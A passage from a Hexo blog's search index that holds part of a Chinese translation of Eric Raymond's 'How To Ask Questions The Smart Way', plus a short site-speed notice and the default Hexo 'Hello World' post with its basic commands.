的详述开关），试着选择这些能在记录中增加调试信息的选项。记住，<code>多</code>不等于<code>好</code>。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。</p><p>如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样黑客们在读你的记录时就知道该注意哪些内容了。</p><h3 id="描述目标而不是过程">描述目标而不是过程</h3><p>如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。</p><p>经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。</p><p><strong>蠢问题</strong></p><blockquote><p>我怎样才能从某绘图程序的颜色选择器中取得十六进制的 RGB 值？</p></blockquote><p><strong>聪明问题</strong></p><blockquote><p>我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot），<br>但却无法从某绘图程序的颜色选择器取得十六进制的 RGB 值。</p></blockquote><p>第二种提问法比较聪明，你可能得到像是<code>建议采用另一个更合适的工具</code>的回复。</p><h3 id="别要求使用私人电邮回复">别要求使用私人电邮回复</h3><p>黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。</p><p>当你要求私下回复时，这个过程和奖励都被中止。别这样做，让<strong>回复者</strong>来决定是否私下回答 —— 如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于不可能使其他人产生兴趣。</p><p>这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句会是<code>向我发电邮，我将为论坛归纳这些回复</code>。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来是非常有礼貌的 —— 但你必须信守诺言。</p><h3 id="清楚明确地表达你的问题以及需求">清楚明确地表达你的问题以及需求</h3><p>漫无边际的提问是近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫无边际的提问。</p><p>如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么做很棒。</p><p>要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。</p><p>所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你获得有用的答案相当有帮助 —— 但这技巧通常和简化问题有所区别。因此，问<code>我想更好地理解 X，可否指点一下哪有好一点说明？</code>通常比问<code>你能解释一下 X 吗？</code>更好。如果你的代码不能运作，通常请别人看看哪里有问题，比要求别人替你改正要明智得多。</p><h3 id="询问有关代码的问题时">询问有关代码的问题时</h3><p>如果没有提示别人应该从何入手，别要求他人帮你调试有问题的代码。张贴几百行的代码，然后说一声：<code>它不能工作</code>会让你完全被忽略。只贴几十行代码，然后说一句：<code>在第七行以后，我期待它显示 &lt;x&gt;，但实际出现的是 &lt;y&gt;</code>比较有可能让你得到回应。</p><p>最有效描述程序问题的方法是提供最精简的 Bug 展示测试用例（bug-demonstrating test case）。什么是最精简的测试用例？那是问题的缩影；一小个程序片段能<strong>刚好</strong>展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试用例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译/直译/被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试用例越小越好（查看 <a href="#%E8%AF%9D%E4%B8%8D%E5%9C%A8%E5%A4%9A%E8%80%8C%E5%9C%A8%E7%B2%BE%EF%BC%89%E4%B8%80%E8%8A%82">话不在多而在精</a>。</p><p>一般而言，要得到一段相当精简的测试用例并不太容易，但永远先尝试这样做是一个好习惯。这种方式可以帮助你了解如何自行解决这个问题 —— 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。</p><p>如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。</p><h3 id="别把自己家庭作业的问题贴上来">别把自己家庭作业的问题贴上来</h3><p>黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由<strong>你</strong>来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。</p><p>如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在用户群组，论坛或（最后一招）在项目的<strong>用户</strong>邮件列表或论坛中提问。尽管黑客们<strong>会</strong>看出来，但一些有经验的用户也许仍会给你一些提示。</p><h3 id="去掉无意义的提问句">去掉无意义的提问句</h3><p>避免用无意义的话结束提问，例如<code>有人能帮我吗？</code>或者<code>这有答案吗？</code>。</p><p>首先：如果你对问题的描述不是很好，这样问更是画蛇添足。</p><p>其次：由于这样问是画蛇添足，黑客们会很厌烦你 —— 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：<code>没错，有人能帮你</code>或者<code>不，没答案</code>。</p><p>一般来说，避免用 <code>是或否</code>、<code>对或错</code>、<code>有或没有</code>类型的问句，除非你想得到 <a href="https://strcat.de/questions-with-yes-or-no-answers.html" rel="external nofollow noreferrer">是或否类型的回答</a>。</p><h3 id="即使你很急也不要在标题写紧急">即使你很急也不要在标题写<code>紧急</code></h3><p>这是你的问题，不是我们的。宣称<code>紧急</code>极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即时引起关注的问题。更严重的是，<code>紧急</code>这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器过滤掉 —— 你希望能看到你问题的人可能永远也看不到。</p><p>有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。</p><p>当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实上，张贴诸如<code>紧急：帮我救救这个毛茸茸的小海豹！</code>肯定让你被黑客忽略或惹恼他们，即使他们认为毛茸茸的小海豹很重要。</p><p>如果你觉得这点很不可思议，最好再把这份指南剩下的内容多读几遍，直到你弄懂了再发文。</p><h3 id="礼多人不怪，而且有时还很有帮助">礼多人不怪，而且有时还很有帮助</h3><p>彬彬有礼，多用<code>请</code>和<code>谢谢您的关注</code>，或<code>谢谢你的关照</code>。让大家都知道你对他们花时间免费提供帮助心存感激。</p><p>坦白说，这一点并没有比使用清晰、正确、精准且合乎语法和避免使用专用格式重要（也不能取而代之）。黑客们一般宁可读有点唐突但技术上鲜明的 Bug 报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教给我们什么来评价问题的价值的）</p><p>然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。</p><p>（我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一条。一些黑客觉得<code>先谢了</code>意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说<code>先谢了</code>，<strong>然后</strong>事后再对回复者表示感谢，或者换种方式表达感激，譬如用<code>谢谢你的关注</code>或<code>谢谢你的关照</code>。）</p><h3 id="问题解决后，加个简短的补充说明">问题解决后，加个简短的补充说明</h3><p>问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。</p><p>最理想的方式是向最初提问的话题回复此消息，并在标题中包含<code>已修正</code>，<code>已解决</code>或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串<code>问题 X</code>和<code>问题 X - 已解决</code>的潜在回复者就明白不用再浪费时间了（除非他个人觉得<code>问题 X</code>有趣），因此可以利用此时间去解决其它问题。</p><p>补充说明不必很长或是很深入；简单的一句<code>你好，原来是网线出了问题！谢谢大家 – Bill</code>比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。</p><p>对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题，在此<strong>之后</strong>才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。</p><p>除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表/新闻群组/论坛中搜索到真正解决你问题的方案，让他们也从中受益。</p><p>至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。</p><p>思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。</p><p>在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。</p><h2 id="如何解读答案">如何解读答案</h2><p><a id="rtfm"></a></p><h3 id="RTFM-和-STFW：如何知道你已完全搞砸了">RTFM 和 STFW：如何知道你已完全搞砸了</h3><p>有一个古老而神圣的传统：如果你收到<code>RTFM（Read The Fucking Manual）</code>的回应，回答者认为你<strong>应该去读他妈的手册</strong>。当然，基本上他是对的，你应该去读一读。</p><p>RTFM 有一个年轻的亲戚。如果你收到<code>STFW（Search The Fucking Web）</code>的回应，回答者认为你<strong>应该到他妈的网上搜索</strong>。那人多半也是对的，去搜索一下吧。（更温和一点的说法是 <strong><a href="http://lmgtfy.com/" rel="external nofollow noreferrer">Google 是你的朋友</a></strong>！）</p><p>在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。</p><p>通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为：</p><ul><li><strong>你需要的信息非常容易获得</strong>；</li><li><strong>你自己去搜索这些信息比灌给你，能让你学到更多</strong>。</li></ul><p>你不应该因此不爽；<strong>依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见</strong>。你应该对他祖母般的慈祥表示感谢。</p><h3 id="如果还是搞不懂">如果还是搞不懂</h3><p>如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了点什么。</p><p>比方说，如果我回答你：<code>看来似乎是 zentry 卡住了；你应该先清除它。</code>，然后，这是一个<strong>很糟的</strong>后续问题回应：<code>zentry 是什么？</code> <strong>好</strong>的问法应该是这样：<code>哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？</code></p><h3 id="处理无礼的回应">处理无礼的回应</h3><p>很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直截了当，一针见血式的交流风格，这种风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。</p><p>如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的前辈多半会招呼他。如果这<strong>没有</strong>发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而<strong>你</strong>将被视为有错的一方，这将伤害到你获取信息或帮助的机会。</p><p>另一方面，你偶尔真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。</p><p>（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会<strong>正常</strong>交往所需的神经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们<strong>喜欢</strong>我们现在这个样子，并且通常对病患标记都有站得住脚的怀疑。）</p><p>Jeff Bigler 的观察总结和这个相关也值得一读 (<strong><a href="http://www.mit.edu/~jcb/tact.html" rel="external nofollow noreferrer">tact filters</a></strong>)。</p><p>在下一节，我们会谈到另一个问题，当<strong>你</strong>行为不当时所会受到的<code>冒犯</code>。</p><h2 id="如何避免扮演失败者">如何避免扮演失败者</h2><p>在黑客社区的论坛中，你以本指南所描述的或类似的方式，可能会有那么几次搞砸了。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。</p><p>这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被言语攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、不去关马桶盖等等。相反地，你该这么做：</p><p>熬过去，这很正常。事实上，它是有益健康且合理的。</p><p>社区的标准不会自行维持，它们是通过参与者积极而<strong>公开地</strong>执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。</p><p>也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称<code>如果你不想帮助用户就闭嘴。</code> 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的唠叨与无用的技术论坛。</p><p>夸张的讲法是：你要的是“友善”（以上述方式）还是有用？两个里面挑一个。</p><p>记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心<strong>你</strong>和<strong>他的社区</strong>而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现得有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像对待脆弱的洋娃娃那样对你。</p><p>有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是<strong>真的</strong>会把问题搞砸。</p><p>这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这点你不用操心。</p><p>也别让自己卷入口水战，最好不要理睬大多数的口水战 —— 当然，这是在你检验它们只是口水战，并且未指出你有搞砸的地方，同时也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。</p><h2 id="不该问的问题">不该问的问题</h2><p>以下是几个经典蠢问题，以及黑客没回答时心中所想的：</p><p>问题：<a href="#q1">我能在哪找到 X 程序或 X 资源？</a></p><p>问题：<a href="#q2">我怎样用 X 做 Y？</a></p><p>问题：<a href="#q3">如何设定我的 shell 提示？</a></p><p>问题：<a href="#q4">我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？</a></p><p>问题：<a href="#q5">我的程序/设定/SQL 语句没有用</a></p><p>问题：<a href="#q6">我的 Windows 电脑有问题，你能帮我吗？</a></p><p>问题：<a href="#q7">我的程序不会动了，我认为系统工具 X 有问题</a></p><p>问题：<a href="#q8">我在安装 Linux（或者 X ）时有问题，你能帮我吗？</a></p><p>问题：<a href="#q9">我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</a></p><hr><p><a id="q1"></a></p><blockquote><p>问题：我能在哪找到 X 程序或 X 资源？</p></blockquote><p>回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 <a href="https://www.google.com" rel="external nofollow noreferrer">Google</a> 吗？</p><p><a id="q2"></a></p><blockquote><p>问题：我怎样用 X 做 Y？</p></blockquote><p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。</p><p><a id="q3"></a></p><blockquote><p>问题：如何设定我的 shell 提示？？</p></blockquote><p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 <a href="#RTFM">RTFM</a>，然后自己去找出来。</p><p><a id="q4"></a></p><blockquote><p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？</p></blockquote><p>回答：试试看就知道了。如果你试过，你就知道了答案，就不用浪费我的时间了。</p><p><a id="q5"></a></p><blockquote><p>问题：我的{程序/设定/SQL 语句}没有用</p></blockquote><p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种</p><ul><li>你还有什么要补充的吗？</li><li>真糟糕，希望你能搞定。</li><li>这关我屁事？</li></ul><p><a id="q6"></a></p><blockquote><p>问题：我的 Windows 电脑有问题，你能帮我吗？</p></blockquote><p>回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。</p><p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你<strong>可以</strong>问与 Windows 相关的问题，只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。</p><p><a id="q7"></a></p><blockquote><p>问题：我的程序不会动了，我认为系统工具 X 有问题</p></blockquote><p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库文件有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。</p><p><a id="q8"></a></p><blockquote><p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？</p></blockquote><p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在 <a href="http://www.linux.org/groups/index.html" rel="external nofollow noreferrer">这儿</a> 找到用户群组的清单）。</p><p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地用户群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 <code>Linux</code> 和<strong>所有</strong>被怀疑的硬件作关键词仔细搜索。</p><p><a id="q9"></a></p><blockquote><p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</p></blockquote><p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！</p><h2 id="好问题与蠢问题">好问题与蠢问题</h2><p>最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我可以在哪儿找到关于 Foonly Flurbamatic 的资料？</p></blockquote><p>这种问法无非想得到 <a href="#RTFM">STFW</a> 这样的回答。</p><p><strong>聪明问题</strong>：</p><blockquote><p>我用 Google 搜索过 “Foonly Flurbamatic 2600”，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？</p></blockquote><p>这个问题已经 STFW 过了，看起来他真的遇到了麻烦。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我从 foo 项目找来的源码没法编译。它怎么这么烂？</p></blockquote><p>他觉得都是别人的错，这个傲慢自大的提问者。</p><p><strong>聪明问题</strong>：</p><blockquote><p>foo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？</p></blockquote><p>提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我的主机板有问题了，谁来帮我？</p></blockquote><p>某黑客对这类问题的回答通常是：<code>好的，还要帮你拍拍背和换尿布吗？</code>，然后按下删除键。</p><p><strong>聪明问题</strong>：</p><blockquote><p>我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？</p></blockquote><p>这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。</p><p>在最后一个问题中，注意<code>告诉我答案</code>和<code>给我启示，指出我还应该做什么诊断工作</code>之间微妙而又重要的区别。</p><p>事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。</p><p>通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他们再浪费时间，我也表明了对他们宝贵时间的尊重。</p><p>事后，当我向每个人表示感谢，并且赞赏这次良好的讨论经历的时候，一个 Linux 内核邮件列表的成员表示，他觉得我的问题得到解决并非由于我是这个列表中的<strong>名</strong>人，而是因为我用了正确的方式来提问。</p><p>黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我<strong>像</strong>个乞讨者那样提问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出现。</p><h2 id="如果得不到回答">如果得不到回答</h2><p>如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。</p><p>总的来说，简单地重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。</p><p>你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。</p><p>有许多网上的以及本地的用户群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。</p><p>另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了 —— 完全可能如此 —— 你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。</p><p>对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名用户。根本不可能由一个人来处理来自上万名用户的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开源软件的要高得多，且内容也没那么丰富）。</p><h2 id="如何更好地回答问题">如何更好地回答问题</h2><p><strong>态度和善一点。</strong> 问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p><p><strong>对初犯者私下回复。</strong> 对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。</p><p><strong>如果你不确定，一定要说出来！</strong> 一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p><p><strong>如果帮不了忙，也别妨碍他。</strong> 不要在实际步骤上开玩笑，那样也许会毁了提问者的设置 —— 有些可怜的呆瓜会把它当成真的指令。</p><p><strong>试探性的反问以引出更多的细节。</strong> 如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。</p><p>尽管对那些懒虫抱怨一声 RTFM 是正当的，但能给出文档的链接（即使只是建议个 Google 搜索关键词）会更好。</p><p><strong>如果你决定回答，就请给出好的答案。</strong> 当别人正在用错误的工具或方法时别建议笨拙的权宜之计（workaround），应推荐更好的工具，重新界定问题。</p><p><strong>正面地回答问题！</strong> 如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 <code>试试看 A 或是 B</code> 或者 <code>试试 X 、 Y 、 Z 、 A 、 B 、 C</code> 并附上一个链接一点用都没有。</p><p><strong>帮助你的社区从问题中学习。</strong> 当回复一个好问题时，问问自己<code>如何修改相关文件或常见问题文件以免再次解答同样的问题？</code>，接着再向文件维护者发一份补丁。</p><p>如果你在研究一番后才作出了回答，<strong>展现你的技巧而不是直接端出结果</strong>。毕竟<code>授人以鱼不如授人以渔</code>。</p><h2 id="相关资源">相关资源</h2><p>如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅 <a href="http://en.tldp.org/HOWTO/Unix-and-Internet-Fundamentals-HOWTO/" rel="external nofollow noreferrer">Unix 系统和网络基本原理</a>。</p><p>当你发布软件或补丁时，试着按 <a href="http://en.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html" rel="external nofollow noreferrer">软件发布实践</a> 操作。</p><h2 id="鸣谢">鸣谢</h2><p>Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写<code>如何更好地回答问题</code>这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。</p>]]></content>
      
      
      <categories>
          
          <category> 摘录笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费机速度很迷</title>
      <link href="/posts/2776437882/"/>
      <url>/posts/2776437882/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本人学生党，而且未来可能也不打算在博客的成本上投入太大。再加上本站使用了比较多的 js，所以速度会很慢。甚至还（不太熟练地）使用了 Pjax，搞不好还以为网页卡死……</p>]]></content>
      
      
      <categories>
          
          <category> 网站公告 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/1243066710/"/>
      <url>/posts/1243066710/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" rel="external nofollow noreferrer">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" rel="external nofollow noreferrer">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" rel="external nofollow noreferrer">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" rel="external nofollow noreferrer">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" rel="external nofollow noreferrer">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" rel="external nofollow noreferrer">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" rel="external nofollow noreferrer">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" rel="external nofollow noreferrer">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
